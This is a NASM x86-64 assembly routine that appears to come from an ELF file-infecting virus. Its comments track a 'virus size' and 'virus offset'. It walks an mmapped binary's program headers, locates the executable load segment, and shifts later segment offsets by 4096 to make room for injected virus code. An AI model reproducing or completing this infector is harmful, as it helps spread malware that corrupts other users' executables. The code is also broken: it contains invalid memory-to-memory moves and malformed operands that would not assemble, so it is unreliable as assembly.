section .text
	global _update_mmaped_file

_update_mmaped_file:
	enter 128, 0
	; rsp + 0  mmap start address (ehdr)
	; rsp + 8  mmap size
	; rsp + 16 virus size
	; rsp + 24 fd
	; rsp + 32 phdr (ehdr + ehdr->e_phoff)
	; rsp + 40 shdr (ehdr + ehdr->e_shoff)
	; rsp + 48 actual phnum
	; rsp + 56 ehdr->e_phnum
	; rsp + 64 found? bool
	; rsp + 72 virus offset
	;
	mov QWORD [rsp], rdi
	mov QWORD [rsp + 8], rsi
	mov QWORD [rsp + 16], rdx
	mov QWORD [rsp + 24], r10
	mov QWORD [rsp + 32], QWORD [rsp]
	add QWORD [rsp + 32], 32
	mov r10, QWORD [rsp + 32]
	mov QWORD [rsp + 32], [r10]
	add QWORD [rsp + 32], QWORD [rsp]
	mov QWORD [rsp + 40], QWORD [rsp]
	add QWORD [rsp + 40], 40
	mov r10, QWORD [rsp + 40]
	mov QWORD [rsp + 40], [r10]
	add QWORD [rsp + 40], QWORD [rsp]
	mov QWORD [rsp + 48], 0
	mov QWORD [rsp + 56], QWORD [rsp]
	add QWORD [rsp + 56], 56
	mov r10, QWORD [rsp + 56]
	mov QWORD [rsp + 56], [r10]
	mov QWORD [rsp + 64], 0
	mov QWORD [rsp + 72], 0

_treat_all_segments:
	mov r10, QWORD [rsp + 56]
	cmp QWORD [rsp + 48], r10
	jge _end

_if:
	cmp QWORD [rsp + 64], 0
	je _else_if
	mov r10, QWORD [rsp + 32]
	add r10, 8
	mov r10, QWORD [r10]
	cmp r10, QWORD [rsp + 72]
	jl _else_if
	mov r10, QWORD [rsp + 32]
	add r10, 8
	add QWORD [r10], 4096
	jmp _inc_jmp_loop

_else_if:
	mov r10, QWORD [rsp + 32]
	cmp DWORD [r10d], 1
	jne _inc_jmp_loop
	add r10, 4
	mov r10d, DWORD [r10]
	and r10d, 1
	cmp DWORD [r10d], 1
	jne _inc_jmp_loop
	mov r10, QWORD [rsp + 32]
	add r10, 8
	mov QWORD [rsp + 72], [r10]
	add r10, 24
	add QWORD [rsp + 72], [r10]

_inc_jmp_loop:
	add QWORD [rsp + 32], 56
	inc QWORD [rsp + 48]
	jmp _treat_all_segments

_end:
	leave
	ret
